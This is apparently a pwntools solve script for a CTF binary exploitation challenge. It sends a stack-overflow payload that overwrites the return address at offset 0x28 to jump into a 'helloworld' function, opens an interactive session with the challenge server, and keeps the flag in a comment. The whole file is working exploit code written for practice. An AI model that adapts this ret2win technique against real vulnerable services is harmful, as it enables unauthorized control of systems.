#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./helloworld_again_patched")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]


def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]


GDB_SCRIPT = '''
b main
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10001)
    return io


def main():
    io = conn()

    payload = flat(
        {
            0: b"helloworld\x00",
            0x28: p64(binary.symbols["helloworld"] + 5)
        },
        length=0x40)

    io.sendlineafter(b"!\n", payload)
    io.interactive()  # ADL{Rur1_15_my_w1fu~https://youtu.be/DuMqFknYHBs}


if __name__ == "__main__":
    main()
